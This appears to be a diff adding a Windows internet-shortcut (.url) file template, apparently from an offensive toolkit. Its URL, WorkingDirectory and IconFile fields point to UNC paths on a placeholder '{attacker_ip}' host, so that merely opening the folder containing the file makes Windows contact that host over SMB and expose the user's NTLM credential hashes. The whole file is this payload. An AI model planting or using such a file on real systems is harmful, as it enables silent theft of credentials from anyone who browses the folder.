@@ -1,0 +1,5 @@
+[InternetShortcut]
+URL={attacker_ip}
+WorkingDirectory=\\{attacker_ip}\test
+IconFile=\\{attacker_ip}\A.icon
+IconIndex=1 
